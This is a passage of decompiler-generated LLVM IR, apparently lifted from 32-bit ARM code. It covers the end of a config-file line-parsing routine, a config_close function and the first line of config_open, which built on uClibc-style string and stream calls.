  store i32 %v1_18c60, i32* %r3.global-to-local, align 4
  %v7_18c64 = icmp eq i32 %v1_18c60, 92
  store i1 %v7_18c64, i1* %cpsr_z.global-to-local, align 1
  %v1_18c68 = trunc i32 %v1_18c5c to i8
  store i8 %v1_18c68, i8* %v1_18c58, align 1
  %v0_18c6c = load i32, i32* @r6, align 4
  %v1_18c6c = add i32 %v0_18c6c, -1
  store i32 %v1_18c6c, i32* @r6, align 4
  %v0_18c70 = load i1, i1* %cpsr_z.global-to-local, align 1
  br i1 %v0_18c70, label %dec_label_pc_18c74, label %dec_label_pc_18d00

dec_label_pc_18c74:                               ; preds = %dec_label_pc_18c58
  %v1_18c74 = add i32 %v0_18c6c, -2
  store i32 %v1_18c74, i32* @r6, align 4
  br label %dec_label_pc_18bfc

dec_label_pc_18c7c:                               ; preds = %dec_label_pc_18c34
  %v0_18c7c = load i32, i32* @r5, align 4
  %v1_18c7c = add i32 %v0_18c7c, 20
  %v2_18c7c = inttoptr i32 %v1_18c7c to i32*
  %v3_18c7c = load i32, i32* %v2_18c7c, align 4
  store i32 %v3_18c7c, i32* %r3.global-to-local, align 4
  %v2_18c80 = icmp eq i32 %v3_18c7c, 0
  store i1 %v2_18c80, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_18c80, label %dec_label_pc_18cb8, label %dec_label_pc_18c88

dec_label_pc_18c88:                               ; preds = %dec_label_pc_18c7c
  %v1_18c88 = add i32 %v0_18c7c, 16
  %v2_18c88 = inttoptr i32 %v1_18c88 to i32*
  %v3_18c88 = load i32, i32* %v2_18c88, align 4
  store i32 %v3_18c88, i32* %r3.global-to-local, align 4
  %v1_18c8c = add i32 %v0_18c7c, 8
  %v2_18c8c = inttoptr i32 %v1_18c8c to i32*
  %v3_18c8c = load i32, i32* %v2_18c8c, align 4
  %v1_18c90 = add i32 %v3_18c88, 4096
  store i32 %v1_18c90, i32* %r3.global-to-local, align 4
  %v2_18c94 = add i32 %v3_18c8c, %v1_18c90
  store i32 %v1_18c90, i32* %v2_18c88, align 4
  %v0_18c9c = load i32, i32* @r5, align 4
  %v1_18c9c = add i32 %v0_18c9c, 4
  %v2_18c9c = inttoptr i32 %v1_18c9c to i32*
  %v3_18c9c = load i32, i32* %v2_18c9c, align 4
  store i32 %v3_18c9c, i32* %r0.global-to-local, align 4
  %v2_18ca0 = inttoptr i32 %v3_18c9c to i32*
  %v3_18ca0 = call i32 @realloc(i32* %v2_18ca0, i32 %v2_18c94)
  store i32 %v3_18ca0, i32* %r0.global-to-local, align 4
  %v0_18ca4 = load i32, i32* @r5, align 4
  %v1_18ca4 = add i32 %v0_18ca4, 8
  %v2_18ca4 = inttoptr i32 %v1_18ca4 to i32*
  %v3_18ca4 = load i32, i32* %v2_18ca4, align 4
  %v2_18ca8 = add i32 %v3_18ca4, %v3_18ca0
  store i32 %v2_18ca8, i32* %r3.global-to-local, align 4
  %v2_18cac = add i32 %v0_18ca4, 12
  %v3_18cac = inttoptr i32 %v2_18cac to i32*
  store i32 %v2_18ca8, i32* %v3_18cac, align 4
  %v1_18cb0 = load i32, i32* @r5, align 4
  %v2_18cb0 = add i32 %v1_18cb0, 4
  %v3_18cb0 = inttoptr i32 %v2_18cb0 to i32*
  store i32 %v3_18ca0, i32* %v3_18cb0, align 4
  %v0_18c04.pre.pre = load i32, i32* @r6, align 4
  br label %dec_label_pc_18bfc

dec_label_pc_18cb8:                               ; preds = %dec_label_pc_18c7c, %.dec_label_pc_18cb8_crit_edge
  %v0_18cb8 = phi i32 [ %v0_18cb8.pre, %.dec_label_pc_18cb8_crit_edge ], [ %v0_18c7c, %dec_label_pc_18c7c ]
  %v1_18cb8 = inttoptr i32 %v0_18cb8 to i32*
  %v2_18cb8 = load i32, i32* %v1_18cb8, align 4
  %v1_18cbc = add i32 %v2_18cb8, 52
  %v2_18cbc = inttoptr i32 %v1_18cbc to i32*
  %v3_18cbc = load i32, i32* %v2_18cbc, align 4
  store i32 %v3_18cbc, i32* %r3.global-to-local, align 4
  %v2_18cc0 = icmp eq i32 %v3_18cbc, 0
  store i1 %v2_18cc0, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_18cc0, label %dec_label_pc_18cec, label %dec_label_pc_18cc8

dec_label_pc_18cc8:                               ; preds = %dec_label_pc_18cb8
  %v1_18cc8 = add i32 %v2_18cb8, 16
  %v2_18cc8 = inttoptr i32 %v1_18cc8 to i32*
  %v3_18cc8 = load i32, i32* %v2_18cc8, align 4
  store i32 %v3_18cc8, i32* %r2.global-to-local, align 4
  %v1_18ccc = add i32 %v2_18cb8, 24
  %v2_18ccc = inttoptr i32 %v1_18ccc to i32*
  %v3_18ccc = load i32, i32* %v2_18ccc, align 4
  store i32 %v3_18ccc, i32* %r3.global-to-local, align 4
  %v3_18cd0 = icmp ult i32 %v3_18cc8, %v3_18ccc
  %v9_18cd0 = icmp eq i32 %v3_18cc8, %v3_18ccc
  store i1 %v9_18cd0, i1* %cpsr_z.global-to-local, align 1
  br i1 %v3_18cd0, label %dec_label_pc_18cf4thread-pre-split, label %dec_label_pc_18ce0

dec_label_pc_18ce0:                               ; preds = %dec_label_pc_18cc8
  store i32 %v2_18cb8, i32* %r0.global-to-local, align 4
  %v1_18ce4 = inttoptr i32 %v2_18cb8 to i16*
  %v2_18ce4 = call i32 @getc_unlocked(i16* %v1_18ce4)
  store i32 %v2_18ce4, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_18cf4

dec_label_pc_18cec:                               ; preds = %dec_label_pc_18cb8
  store i32 %v2_18cb8, i32* %r0.global-to-local, align 4
  %v1_18cf0 = call i32 @__GI_fgetc(i32 %v2_18cb8)
  store i32 %v1_18cf0, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_18cf4

dec_label_pc_18cf4thread-pre-split:               ; preds = %dec_label_pc_18cc8
  %v2_18cd4 = inttoptr i32 %v3_18cc8 to i8*
  %v3_18cd4 = load i8, i8* %v2_18cd4, align 1
  %v4_18cd4 = zext i8 %v3_18cd4 to i32
  store i32 %v4_18cd4, i32* %r0.global-to-local, align 4
  %v6_18cd4 = add i32 %v3_18cc8, 1
  store i32 %v6_18cd4, i32* %r2.global-to-local, align 4
  store i32 %v6_18cd4, i32* %v2_18cc8, align 4
  %v0_18cf4.pr = load i32, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_18cf4

dec_label_pc_18cf4:                               ; preds = %dec_label_pc_18cf4thread-pre-split, %dec_label_pc_18ce0, %dec_label_pc_18cec
  %v1_18cf8 = phi i32 [ %v0_18cf4.pr, %dec_label_pc_18cf4thread-pre-split ], [ %v2_18ce4, %dec_label_pc_18ce0 ], [ %v1_18cf0, %dec_label_pc_18cec ]
  %v7_18cf4 = icmp eq i32 %v1_18cf8, 10
  store i1 %v7_18cf4, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_18cf4, label %dec_label_pc_18d00.loopexit, label %bb68

bb68:                                             ; preds = %dec_label_pc_18cf4
  %v8_18cf8 = icmp eq i32 %v1_18cf8, -1
  store i1 %v8_18cf8, i1* %cpsr_z.global-to-local, align 1
  br i1 %v8_18cf8, label %dec_label_pc_18d00.loopexit, label %.dec_label_pc_18cb8_crit_edge

.dec_label_pc_18cb8_crit_edge:                    ; preds = %bb68
  %v0_18cb8.pre = load i32, i32* @r5, align 4
  br label %dec_label_pc_18cb8

dec_label_pc_18d00.loopexit:                      ; preds = %bb68, %dec_label_pc_18cf4
  %v0_18d00.pre = load i32, i32* @r6, align 4
  br label %dec_label_pc_18d00

dec_label_pc_18d00:                               ; preds = %dec_label_pc_18c58, %dec_label_pc_18d00.loopexit
  %v0_18d00 = phi i32 [ %v0_18d00.pre, %dec_label_pc_18d00.loopexit ], [ %v1_18c6c, %dec_label_pc_18c58 ]
  %v7_18d00 = icmp eq i32 %v0_18d00, -1
  store i1 %v7_18d00, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_18d00, label %dec_label_pc_18e48, label %dec_label_pc_18d08

dec_label_pc_18d08:                               ; preds = %dec_label_pc_18d00
  %v0_18d08 = load i32, i32* @r5, align 4
  %v1_18d08 = add i32 %v0_18d08, 4
  %v2_18d08 = inttoptr i32 %v1_18d08 to i32*
  %v3_18d08 = load i32, i32* %v2_18d08, align 4
  store i32 %v3_18d08, i32* %r0.global-to-local, align 4
  store i32 %v3_18b5c, i32* @r2, align 4
  store i32 %arg2, i32* %r3.global-to-local, align 4
  store i32 %v3_18d08, i32* %v2_18d14, align 4
  %v0_18d18 = load i32, i32* @fp, align 4
  %v2_18d1c = inttoptr i32 %v3_18d08 to i8*
  %v3_18d1c = call i32 @__GI_memset(i8* %v2_18d1c, i32 %v0_18d18)
  store i32 %v3_18d1c, i32* %r0.global-to-local, align 4
  store i32 %v1_18b70, i32* %r2.global-to-local, align 4
  store i1 %v2_18d24, i1* %cpsr_z.global-to-local, align 1
  %v0_18d28 = load i32, i32* @r5, align 4
  %v1_18d28 = add i32 %v0_18d28, 12
  %v2_18d28 = inttoptr i32 %v1_18d28 to i32*
  %v3_18d28 = load i32, i32* %v2_18d28, align 4
  store i32 %v3_18d28, i32* @r4, align 4
  br i1 %v2_18d24, label %dec_label_pc_18d40, label %dec_label_pc_18d30

dec_label_pc_18d30:                               ; preds = %dec_label_pc_18d08
  store i32 %v3_18d28, i32* @r0, align 4
  %v1_18d38 = inttoptr i32 %v3_18d28 to i8*
  %v2_18d38 = call i32 @__GI_strspn(i8* %v1_18d38)
  store i32 %v2_18d38, i32* %r0.global-to-local, align 4
  %v0_18d3c = load i32, i32* @r4, align 4
  %v2_18d3c = add i32 %v0_18d3c, %v2_18d38
  store i32 %v2_18d3c, i32* @r4, align 4
  br label %dec_label_pc_18d40

dec_label_pc_18d40:                               ; preds = %dec_label_pc_18d08, %dec_label_pc_18d30
  %v0_18e1813 = phi i32 [ %v3_18d28, %dec_label_pc_18d08 ], [ %v2_18d3c, %dec_label_pc_18d30 ]
  %v1_18d40 = inttoptr i32 %v0_18e1813 to i8*
  %v2_18d40 = load i8, i8* %v1_18d40, align 1
  %v3_18d40 = zext i8 %v2_18d40 to i32
  store i32 %v3_18d40, i32* %r2.global-to-local, align 4
  %v2_18d44 = icmp eq i8 %v2_18d40, 0
  store i1 %v2_18d44, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_18d44, label %dec_label_pc_18b98.backedge, label %dec_label_pc_18d4c

dec_label_pc_18b98.backedge:                      ; preds = %dec_label_pc_18d40, %dec_label_pc_18e40, %dec_label_pc_18d4c
  %v0_18b98.pre = load i32, i32* @r5, align 4
  br label %dec_label_pc_18b98

dec_label_pc_18d4c:                               ; preds = %dec_label_pc_18d40
  %v0_18d4c = load i32, i32* @r7, align 4
  %v1_18d4c = inttoptr i32 %v0_18d4c to i8*
  %v2_18d4c = load i8, i8* %v1_18d4c, align 1
  %v3_18d4c = zext i8 %v2_18d4c to i32
  store i32 %v3_18d4c, i32* %r3.global-to-local, align 4
  %v9_18d50 = icmp eq i8 %v2_18d4c, %v2_18d40
  store i1 %v9_18d50, i1* %cpsr_z.global-to-local, align 1
  br i1 %v9_18d50, label %dec_label_pc_18b98.backedge, label %dec_label_pc_18e18.preheader

dec_label_pc_18e18.preheader:                     ; preds = %dec_label_pc_18d4c
  %v1_18d54 = load i32, i32* @fp, align 4
  store i32 %v1_18d54, i32* @r6, align 4
  %v2_18e1815 = load i8, i8* %v1_18d40, align 1
  %v3_18e1816 = zext i8 %v2_18e1815 to i32
  store i32 %v3_18e1816, i32* %r2.global-to-local, align 4
  %v2_18e1c17 = icmp eq i8 %v2_18e1815, 0
  store i1 %v2_18e1c17, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_18e1c17, label %dec_label_pc_18e34, label %dec_label_pc_18e24.preheader

dec_label_pc_18e24.preheader:                     ; preds = %dec_label_pc_18e18.preheader
  %v2_18e2482 = load i8, i8* %v1_18d4c, align 1
  %v3_18e2483 = zext i8 %v2_18e2482 to i32
  store i32 %v3_18e2483, i32* %r3.global-to-local, align 4
  %v9_18e2886 = icmp eq i8 %v2_18e2482, %v2_18e1815
  store i1 %v9_18e2886, i1* %cpsr_z.global-to-local, align 1
  br i1 %v9_18e2886, label %dec_label_pc_18e34, label %bb74

dec_label_pc_18d60:                               ; preds = %bb74
  store i32 %arg2, i32* %r2.global-to-local, align 4
  %v2_18d64 = load i32, i32* %v2_18d14, align 4
  store i32 %v2_18d64, i32* %r3.global-to-local, align 4
  store i32 %v1_18b74, i32* %r2.global-to-local, align 4
  %v9_18d6c = icmp eq i32 %v2_18d7088, %v1_18b74
  store i1 %v9_18d6c, i1* %cpsr_z.global-to-local, align 1
  %v5_18d70 = mul i32 %v2_18d7088, 4
  %v6_18d70 = add i32 %v2_18d64, %v5_18d70
  %v7_18d70 = inttoptr i32 %v6_18d70 to i32*
  store i32 %v0_18d7087, i32* %v7_18d70, align 4
  br i1 %v9_18d6c, label %dec_label_pc_18d78, label %dec_label_pc_18d84

dec_label_pc_18d78:                               ; preds = %dec_label_pc_18d60
  store i32 %v1_18b80, i32* %r3.global-to-local, align 4
  store i1 %v2_18d7c, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_18d7c, label %dec_label_pc_18d84, label %dec_label_pc_18da4

dec_label_pc_18d84:                               ; preds = %dec_label_pc_18d78, %dec_label_pc_18d60
  %v0_18d84 = load i32, i32* @r7, align 4
  %v1_18d84 = inttoptr i32 %v0_18d84 to i8*
  %v2_18d84 = load i8, i8* %v1_18d84, align 1
  %v3_18d84 = zext i8 %v2_18d84 to i32
  store i32 %v3_18d84, i32* %r3.global-to-local, align 4
  %v2_18d88 = icmp eq i8 %v2_18d84, 0
  store i1 %v2_18d88, i1* %cpsr_z.global-to-local, align 1
  %v0_18d8c = load i32, i32* @r4, align 4
  store i32 %v0_18d8c, i32* @r0, align 4
  %v1_18d90 = load i32, i32* @sl, align 4
  %storemerge = select i1 %v2_18d88, i32 %v1_18d90, i32 %v0_18d84
  store i32 %storemerge, i32* @r1, align 4
  %v0_18d98 = call i32 @strcspn()
  store i32 %v0_18d98, i32* %r0.global-to-local, align 4
  %v0_18d9c = load i32, i32* @r4, align 4
  %v2_18d9c = add i32 %v0_18d9c, %v0_18d98
  store i32 %v2_18d9c, i32* @r4, align 4
  br label %dec_label_pc_18ddc

dec_label_pc_18da4:                               ; preds = %dec_label_pc_18d78
  %v0_18da4 = load i32, i32* @r4, align 4
  store i32 %v0_18da4, i32* @r0, align 4
  %v0_18da8 = load i32, i32* @r7, align 4
  %v1_18da8 = inttoptr i32 %v0_18da8 to i8*
  %v2_18da8 = load i8, i8* %v1_18da8, align 1
  %v3_18da8 = zext i8 %v2_18da8 to i32
  %v5_18dac = call i32 @__GI_strchrnul(i32 %v0_18da4, i32 %v3_18da8, i32 %v1_18b74, i32 %v1_18b80)
  store i32 %v5_18dac, i32* %r0.global-to-local, align 4
  store i32 %v1_18b70, i32* %r2.global-to-local, align 4
  store i1 %v2_18d24, i1* %cpsr_z.global-to-local, align 1
  store i32 %v5_18dac, i32* @r4, align 4
  br i1 %v2_18d24, label %dec_label_pc_18ddc, label %dec_label_pc_18dc8

dec_label_pc_18dc4:                               ; preds = %dec_label_pc_18dc8
  %v1_18dc4 = add i32 %v0_18ddc.pre, -1
  store i32 %v1_18dc4, i32* @r4, align 4
  br label %dec_label_pc_18dc8

dec_label_pc_18dc8:                               ; preds = %dec_label_pc_18da4, %dec_label_pc_18dc4
  %v0_18dc8 = phi i32 [ %v1_18dc4, %dec_label_pc_18dc4 ], [ %v5_18dac, %dec_label_pc_18da4 ]
  %v1_18dc8 = add i32 %v0_18dc8, -1
  %v2_18dc8 = inttoptr i32 %v1_18dc8 to i8*
  %v3_18dc8 = load i8, i8* %v2_18dc8, align 1
  %v4_18dc8 = zext i8 %v3_18dc8 to i32
  %v0_18dcc = load i32, i32* @sl, align 4
  store i32 %v0_18dcc, i32* @r0, align 4
  %v2_18dd0 = call i32 @__GI_strchr(i32 %v0_18dcc, i32 %v4_18dc8)
  store i32 %v2_18dd0, i32* %r0.global-to-local, align 4
  %v2_18dd4 = icmp eq i32 %v2_18dd0, 0
  store i1 %v2_18dd4, i1* %cpsr_z.global-to-local, align 1
  %v0_18ddc.pre = load i32, i32* @r4, align 4
  br i1 %v2_18dd4, label %dec_label_pc_18ddc, label %dec_label_pc_18dc4

dec_label_pc_18ddc:                               ; preds = %dec_label_pc_18dc8, %dec_label_pc_18da4, %dec_label_pc_18d84
  %v3_18de8 = phi i32 [ %v5_18dac, %dec_label_pc_18da4 ], [ %v2_18d9c, %dec_label_pc_18d84 ], [ %v0_18ddc.pre, %dec_label_pc_18dc8 ]
  %v1_18ddc = inttoptr i32 %v3_18de8 to i8*
  %v2_18ddc = load i8, i8* %v1_18ddc, align 1
  %v3_18ddc = zext i8 %v2_18ddc to i32
  store i32 %v3_18ddc, i32* %r2.global-to-local, align 4
  %v0_18de0 = load i32, i32* @r7, align 4
  %v1_18de0 = inttoptr i32 %v0_18de0 to i8*
  %v2_18de0 = load i8, i8* %v1_18de0, align 1
  %v3_18de0 = zext i8 %v2_18de0 to i32
  store i32 %v3_18de0, i32* %r3.global-to-local, align 4
  %v9_18de4 = icmp eq i8 %v2_18de0, %v2_18ddc
  store i1 %v9_18de4, i1* %cpsr_z.global-to-local, align 1
  br i1 %v9_18de4, label %bb71, label %dec_label_pc_18df0

bb71:                                             ; preds = %dec_label_pc_18ddc
  %v1_18de8 = load i32, i32* @fp, align 4
  %v2_18de8 = trunc i32 %v1_18de8 to i8
  store i8 %v2_18de8, i8* %v1_18ddc, align 1
  %v0_18dec.pr = load i1, i1* %cpsr_z.global-to-local, align 1
  br i1 %v0_18dec.pr, label %bb73, label %.dec_label_pc_18df0_crit_edge

.dec_label_pc_18df0_crit_edge:                    ; preds = %bb71
  %v0_18df0.pre = load i32, i32* %r2.global-to-local, align 4
  br label %dec_label_pc_18df0

dec_label_pc_18df0:                               ; preds = %.dec_label_pc_18df0_crit_edge, %dec_label_pc_18ddc
  %v0_18df0 = phi i32 [ %v0_18df0.pre, %.dec_label_pc_18df0_crit_edge ], [ %v3_18ddc, %dec_label_pc_18ddc ]
  %v2_18df0 = icmp eq i32 %v0_18df0, 0
  store i1 %v2_18df0, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_18df0, label %bb73, label %bb72

bb72:                                             ; preds = %dec_label_pc_18df0
  %v1_18df4 = load i32, i32* @fp, align 4
  %v2_18df4 = trunc i32 %v1_18df4 to i8
  %v3_18df4 = load i32, i32* @r4, align 4
  %v4_18df4 = inttoptr i32 %v3_18df4 to i8*
  store i8 %v2_18df4, i8* %v4_18df4, align 1
  %v5_18df4 = load i32, i32* @r4, align 4
  %v6_18df4 = add i32 %v5_18df4, 1
  store i32 %v6_18df4, i32* @r4, align 4
  br label %bb73

bb73:                                             ; preds = %bb71, %dec_label_pc_18df0, %bb72
  %v2_18df8 = load i32, i32* %stack_var_-72, align 4
  store i32 %v2_18df8, i32* %r3.global-to-local, align 4
  %v2_18dfc = icmp eq i32 %v2_18df8, 0
  store i1 %v2_18dfc, i1* %cpsr_z.global-to-local, align 1
  %v0_18e18.pre = load i32, i32* @r4, align 4
  br i1 %v2_18dfc, label %dec_label_pc_18e14, label %dec_label_pc_18e04

dec_label_pc_18e04:                               ; preds = %bb73
  store i32 %v0_18e18.pre, i32* @r0, align 4
  %v1_18e0c = inttoptr i32 %v0_18e18.pre to i8*
  %v2_18e0c = call i32 @__GI_strspn(i8* %v1_18e0c)
  store i32 %v2_18e0c, i32* %r0.global-to-local, align 4
  %v0_18e10 = load i32, i32* @r4, align 4
  %v2_18e10 = add i32 %v0_18e10, %v2_18e0c
  store i32 %v2_18e10, i32* @r4, align 4
  br label %dec_label_pc_18e14

dec_label_pc_18e14:                               ; preds = %bb73, %dec_label_pc_18e04
  %v0_18e18 = phi i32 [ %v2_18e10, %dec_label_pc_18e04 ], [ %v0_18e18.pre, %bb73 ]
  %v0_18e14 = load i32, i32* @r6, align 4
  %v1_18e14 = add i32 %v0_18e14, 1
  store i32 %v1_18e14, i32* @r6, align 4
  %v1_18e18 = inttoptr i32 %v0_18e18 to i8*
  %v2_18e18 = load i8, i8* %v1_18e18, align 1
  %v3_18e18 = zext i8 %v2_18e18 to i32
  store i32 %v3_18e18, i32* %r2.global-to-local, align 4
  %v2_18e1c = icmp eq i8 %v2_18e18, 0
  store i1 %v2_18e1c, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_18e1c, label %dec_label_pc_18e34, label %dec_label_pc_18e14.dec_label_pc_18e24_crit_edge

dec_label_pc_18e14.dec_label_pc_18e24_crit_edge:  ; preds = %dec_label_pc_18e14
  %v0_18e24.pre = load i32, i32* @r7, align 4
  %v1_18e24 = inttoptr i32 %v0_18e24.pre to i8*
  %v2_18e24 = load i8, i8* %v1_18e24, align 1
  %v3_18e24 = zext i8 %v2_18e24 to i32
  store i32 %v3_18e24, i32* %r3.global-to-local, align 4
  %v9_18e28 = icmp eq i8 %v2_18e24, %v2_18e18
  store i1 %v9_18e28, i1* %cpsr_z.global-to-local, align 1
  br i1 %v9_18e28, label %dec_label_pc_18e34, label %bb74

bb74:                                             ; preds = %dec_label_pc_18e24.preheader, %dec_label_pc_18e14.dec_label_pc_18e24_crit_edge
  %v2_18d7088 = phi i32 [ %v1_18e14, %dec_label_pc_18e14.dec_label_pc_18e24_crit_edge ], [ %v1_18d54, %dec_label_pc_18e24.preheader ]
  %v0_18d7087 = phi i32 [ %v0_18e18, %dec_label_pc_18e14.dec_label_pc_18e24_crit_edge ], [ %v0_18e1813, %dec_label_pc_18e24.preheader ]
  %v2_18e2c = load i32, i32* @sb, align 4
  %v3_18e2c = sub i32 %v2_18d7088, %v2_18e2c
  %v5_18e2c = xor i32 %v2_18e2c, %v2_18d7088
  %v6_18e2c = xor i32 %v3_18e2c, %v2_18d7088
  %v7_18e2c = and i32 %v6_18e2c, %v5_18e2c
  %v8_18e2c = icmp slt i32 %v7_18e2c, 0
  %v9_18e2c = icmp slt i32 %v3_18e2c, 0
  %v10_18e2c = icmp eq i32 %v2_18d7088, %v2_18e2c
  store i1 %v10_18e2c, i1* %cpsr_z.global-to-local, align 1
  %v2_18e30 = xor i1 %v9_18e2c, %v8_18e2c
  br i1 %v2_18e30, label %dec_label_pc_18d60, label %dec_label_pc_18e34

dec_label_pc_18e34:                               ; preds = %dec_label_pc_18e24.preheader, %bb74, %dec_label_pc_18e14, %dec_label_pc_18e14.dec_label_pc_18e24_crit_edge, %dec_label_pc_18e18.preheader
  %v0_18e38 = phi i32 [ %v1_18d54, %dec_label_pc_18e18.preheader ], [ %v1_18d54, %dec_label_pc_18e24.preheader ], [ %v2_18d7088, %bb74 ], [ %v1_18e14, %dec_label_pc_18e14 ], [ %v1_18e14, %dec_label_pc_18e14.dec_label_pc_18e24_crit_edge ]
  store i32 %v3_18b58, i32* %r2.global-to-local, align 4
  %v9_18e38 = icmp eq i32 %v0_18e38, %v3_18b58
  store i1 %v9_18e38, i1* %cpsr_z.global-to-local, align 1
  %v6_18e3c = icmp slt i32 %v0_18e38, %v3_18b58
  br i1 %v6_18e3c, label %dec_label_pc_18e40, label %dec_label_pc_18e4c

dec_label_pc_18e40:                               ; preds = %dec_label_pc_18e34
  %v0_18e40 = load i32, i32* @r8, align 4
  %v1_18e40 = and i32 %v0_18e40, 1048576
  %v2_18e40 = icmp eq i32 %v1_18e40, 0
  store i1 %v2_18e40, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_18e40, label %dec_label_pc_18b98.backedge, label %dec_label_pc_18e48

dec_label_pc_18e48:                               ; preds = %dec_label_pc_18e40, %dec_label_pc_18d00, %.thread, %entry
  br label %dec_label_pc_18e4c

dec_label_pc_18e4c:                               ; preds = %dec_label_pc_18e34, %dec_label_pc_18c1c, %dec_label_pc_18e48
  %v0_18e4c = phi i32 [ %v0_18c2c, %dec_label_pc_18c1c ], [ 0, %dec_label_pc_18e48 ], [ %v0_18e38, %dec_label_pc_18e34 ]
  store i32 %v0_18e4c, i32* %r0.global-to-local, align 4
  store i32 %v3_18b34, i32* @r4, align 4
  store i32 %v6_18b34, i32* @r5, align 4
  store i32 %v9_18b34, i32* @r6, align 4
  store i32 %v12_18b34, i32* @r7, align 4
  store i32 %v15_18b34, i32* @r8, align 4
  store i32 %v18_18b34, i32* @sb, align 4
  store i32 %v21_18b34, i32* @sl, align 4
  store i32 %v24_18b34, i32* @fp, align 4
  ret i32 %v0_18e4c

; uselistorder directives
  uselistorder i32 %v0_18e4c, { 1, 0 }
  uselistorder i32 %v0_18e38, { 0, 2, 1 }
  uselistorder i32 %v3_18e2c, { 1, 0 }
  uselistorder i32 %v2_18e2c, { 1, 0, 2 }
  uselistorder i32 %v2_18d7088, { 0, 1, 6, 5, 2, 3, 4 }
  uselistorder i1 %v9_18e28, { 1, 0 }
  uselistorder i32 %v0_18e18.pre, { 0, 2, 1 }
  uselistorder i32 %v5_18dac, { 1, 0, 2, 3 }
  uselistorder i1 %v9_18e2886, { 1, 0 }
  uselistorder i1 %v9_18d50, { 1, 0 }
  uselistorder i32 %v3_18d28, { 0, 2, 1, 3 }
  uselistorder i1 %v7_18d00, { 1, 0 }
  uselistorder i1 %v8_18cf8, { 1, 0 }
  uselistorder i32 %v3_18cc8, { 1, 0, 2, 3, 4 }
  uselistorder i32 %v2_18cb8, { 3, 2, 0, 1, 4, 5, 6 }
  uselistorder i32 %v3_18ca0, { 1, 0, 2 }
  uselistorder i32 %v1_18c90, { 1, 0, 2 }
  uselistorder i32 %v0_18c7c, { 0, 2, 1, 3 }
  uselistorder i32 %v1_18c74, { 1, 0 }
  uselistorder i32 %v1_18c60, { 1, 0 }
  uselistorder i32 %v1_18c5c, { 1, 0 }
  uselistorder i32 %v2_18c38, { 1, 0 }
  uselistorder i32 %v1_18c1c, { 2, 0, 1 }
  uselistorder i32 %v0_18c04, { 1, 0 }
  uselistorder i32 %v1_18bf4, { 0, 2, 1 }
  uselistorder i1 %v2_18d24, { 1, 0, 2, 3 }
  uselistorder i32 %v1_18b80, { 2, 0, 1, 3 }
  uselistorder i32 %v1_18b74, { 2, 1, 0 }
  uselistorder i32 %v3_18b5c, { 1, 0 }
  uselistorder i32 %v3_18b58, { 2, 1, 0 }
  uselistorder i32 %v1_18b50, { 2, 0, 1 }
  uselistorder i32* %r3.global-to-local, { 6, 1, 2, 3, 4, 5, 25, 7, 8, 9, 10, 11, 12, 13, 14, 15, 16, 17, 18, 19, 20, 21, 22, 23, 24, 0 }
  uselistorder i32* %r2.global-to-local, { 2, 8, 3, 4, 5, 6, 7, 1, 9, 10, 11, 12, 13, 14, 15, 16, 0 }
  uselistorder i32* %r0.global-to-local, { 1, 2, 3, 4, 5, 6, 8, 7, 11, 12, 10, 9, 14, 13, 16, 15, 17, 18, 21, 19, 20, 25, 22, 23, 24, 28, 26, 27, 0 }
  uselistorder i1* %cpsr_z.global-to-local, { 1, 2, 12, 13, 14, 3, 4, 5, 6, 7, 8, 9, 10, 11, 33, 0, 15, 16, 17, 18, 19, 20, 21, 22, 23, 24, 25, 26, 27, 28, 29, 30, 31, 32 }
  uselistorder i32 %arg3, { 3, 4, 2, 0, 1, 5, 6 }
  uselistorder label %dec_label_pc_18e4c, { 2, 0, 1 }
  uselistorder label %dec_label_pc_18e34, { 1, 3, 2, 0, 4 }
  uselistorder label %bb74, { 1, 0 }
  uselistorder label %dec_label_pc_18e14, { 1, 0 }
  uselistorder label %bb73, { 2, 1, 0 }
  uselistorder label %dec_label_pc_18dc8, { 1, 0 }
  uselistorder label %dec_label_pc_18b98.backedge, { 1, 2, 0 }
  uselistorder label %dec_label_pc_18d40, { 1, 0 }
  uselistorder label %dec_label_pc_18d00, { 1, 0 }
  uselistorder label %dec_label_pc_18cf4, { 0, 2, 1 }
  uselistorder label %dec_label_pc_18cb8, { 1, 0 }
  uselistorder label %dec_label_pc_18bec, { 1, 0 }
  uselistorder label %.thread, { 1, 0 }
  uselistorder label %bb66, { 1, 0 }
}

define i32 @__GI_config_close(i32* %arg1) local_unnamed_addr {
entry:
  %tmp = ptrtoint i32* %arg1 to i32
  store i32 %tmp, i32* @r4, align 4
  %v2_18e60 = icmp eq i32* %arg1, null
  br i1 %v2_18e60, label %dec_label_pc_18e88, label %dec_label_pc_18e68

dec_label_pc_18e68:                               ; preds = %entry
  %v2_18e68 = load i32, i32* %arg1, align 4
  %v1_18e6c = inttoptr i32 %v2_18e68 to i16*
  %v2_18e6c = call i32 @__GI_fclose(i16* %v1_18e6c)
  %v0_18e70 = load i32, i32* @r4, align 4
  %v1_18e70 = add i32 %v0_18e70, 20
  %v2_18e70 = inttoptr i32 %v1_18e70 to i32*
  %v3_18e70 = load i32, i32* %v2_18e70, align 4
  %v2_18e74 = icmp eq i32 %v3_18e70, 0
  br i1 %v2_18e74, label %bb6, label %bb

bb:                                               ; preds = %dec_label_pc_18e68
  br label %bb6

bb6:                                              ; preds = %dec_label_pc_18e68, %bb
  store i32 102016, i32* @lr, align 4
  %v1_18e7c = xor i1 %v2_18e74, true
  call void @__pseudo_cond_branch(i1 %v1_18e7c, i32 ptrtoint (i32* @global_var_168b4.827 to i32))
  %v0_18e80 = load i32, i32* @r4, align 4
  store i32 %v0_18e80, i32* @r0, align 4
  %v0_18e84 = call i32 @free()
  br label %dec_label_pc_18e88

dec_label_pc_18e88:                               ; preds = %entry, %bb6
  %v1_18e8c = phi i32 [ 0, %entry ], [ %v0_18e84, %bb6 ]
  ret i32 %v1_18e8c

; uselistorder directives
  uselistorder label %dec_label_pc_18e88, { 1, 0 }
  uselistorder label %bb6, { 1, 0 }
}

define i32 @__GI_config_open(i32 %arg1) local_unnamed_addr {
entry:
